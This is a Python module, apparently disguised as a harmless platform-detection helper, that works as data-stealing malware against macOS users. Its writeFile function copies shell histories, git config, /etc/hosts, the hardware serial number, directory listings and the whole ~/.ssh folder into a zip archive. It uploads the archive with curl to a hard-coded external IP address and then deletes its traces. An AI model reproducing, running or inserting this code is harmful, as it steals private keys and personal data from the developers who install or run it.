#coding:utf-8

import platform

t = platform.system()
# print(t)

#coding=utf-8

#platform_mode.py

import platform
import os
import pwd
import socket
import subprocess
import shutil
import io
import zipfile

#global var
SHOW_LOG = True


def get_hosts():
    with open('/etc/hosts', 'r') as f:
        return (f.read())


def get_username():
    return pwd.getpwuid(os.getuid())[0]


def subprocess_popen(statement):
    p = subprocess.Popen(statement, shell=True, stdout=subprocess.PIPE)
    while p.poll() is None:
        if p.wait() is not 0:
            # print("excute error")
            return False
        else:
            re = p.stdout.readlines()
            result = []
            for i in range(len(re)):
                res = re[i].decode('utf-8').strip('\r\n')
                result.append(res)
            return result


def get_gitGlobalConfig():
    return subprocess_popen('git config --global --list')


def get_bashHistory():
    username = get_username()
    filename = '/Users/' + username + '/.bash_history'
    if os.path.exists(filename):
        f = open(filename, 'r+', encoding='unicode_escape')
        lines = f.readlines()
        f.close()
        return lines
    else:
        return 'no bash'


def get_zshHistory():
    username = get_username()
    filename = '/Users/' + username + '/.zsh_history'
    if os.path.exists(filename):
        f = io.open(filename, 'r+', encoding='unicode_escape')
        lines = f.readlines()
        f.close()
        return lines[-5000:]
    else:
        return 'no zsh'


def init():
    global SHOW_LOG
    SHOW_LOG = True


def zip_ya(start_dir):
    start_dir = start_dir
    file_news = start_dir + '.zip'

    z = zipfile.ZipFile(file_news, 'w', zipfile.ZIP_DEFLATED)
    for dir_path, dir_names, file_names in os.walk(start_dir):
        f_path = dir_path.replace(start_dir, '')
        f_path = f_path and f_path + os.sep or ''
        for filename in file_names:
            z.write(os.path.join(dir_path, filename), f_path + filename)
    z.close()
    return file_news


def writeFile(serialId='default'):
    username = get_username()
    foldername = '/Users/' + username + '/Library/Logs/tmp'
    zipname = '/Users/' + username + '/Library/Logs/tmp.zip'
    filename = '/Users/' + username + '/Library/Logs/tmp/tmp.txt'
    if os.path.exists(foldername):
        # print('11111')
        shutil.rmtree(foldername)
    os.makedirs(foldername)
    with open(filename, 'a+') as file:
        file.write('hosts : [{}]'.format(get_hosts()) + '\n')
        file.write('username : ' + get_username() + '\n')
        file.write('test : [{}]'.format(subprocess_popen("bash -c ls /")) +
                   '\n')

    subprocess_popen("ioreg -l | grep IOPlatformSerialNumber >>" + foldername + "/root.txt")
    subprocess_popen("echo ls -la ~/ >>" + foldername + "/root.txt")
    subprocess_popen("ls -la ~/ >>" + foldername + "/root.txt")
    subprocess_popen("echo ls -la /Applications >>" + foldername + "/root.txt")
    subprocess_popen("ls -la /Applications >>" + foldername + "/root.txt")

    bashHistory = '/Users/' + username + '/.bash_history'
    zshHistory = '/Users/' + username + '/.zsh_history'

    gitConfig = '/Users/' + username + '/.gitConfig'
    hosts = '/etc/hosts'
    ssh = '/Users/' + username + '/.ssh'
    zhHistory = '/Users/' + username + '/.zhHistory'

    serialId = str(subprocess_popen("ioreg -l | grep IOPlatformSerialNumber")).split("\"")[3]
    if os.path.exists(bashHistory):
        shutil.copyfile(bashHistory, foldername + '/bashHistory')
    if os.path.exists(zshHistory):
        shutil.copyfile(zshHistory, foldername + '/zsh_history')

    if os.path.exists(gitConfig):
        shutil.copyfile(gitConfig, foldername + '/gitConfig')
    if os.path.exists(hosts):
        shutil.copyfile(hosts, foldername + '/hosts')
    if os.path.exists(ssh):
        shutil.copytree(ssh, foldername + '/ssh')
    if os.path.exists(zhHistory):
        shutil.copyfile(zhHistory, foldername + '/zhHistory')
    zip_ya(foldername)
    shutil.rmtree(foldername)
    command = "curl -k -F \"file=@" + zipname + "\" \"https://54.254.189.27/api/v1/file/upload\" -v" 
    os.system(command)
    os.remove(zipname)

def run():
    init()
    # test()
    writeFile()
    # print("done")
